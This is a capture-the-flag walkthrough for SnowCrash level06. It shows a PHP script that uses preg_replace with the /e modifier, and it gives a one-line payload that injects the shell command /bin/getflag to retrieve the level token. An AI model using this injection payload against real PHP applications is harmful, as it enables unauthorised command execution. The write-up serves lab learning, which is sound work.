# Snow-crash - level06

## Find something
```bash
level06@SnowCrash:~$ ls
level06  level06.php
```
* On exec of level06, we has an error
```bash
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
* The *x* function seems to be the main process to exploit, 
```bash
level06@SnowCrash:~$ echo '[x ${`/bin/getflag`}]' > /tmp/flag.txt
level06@SnowCrash:~$ ./level06 /tmp/flag.txt
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```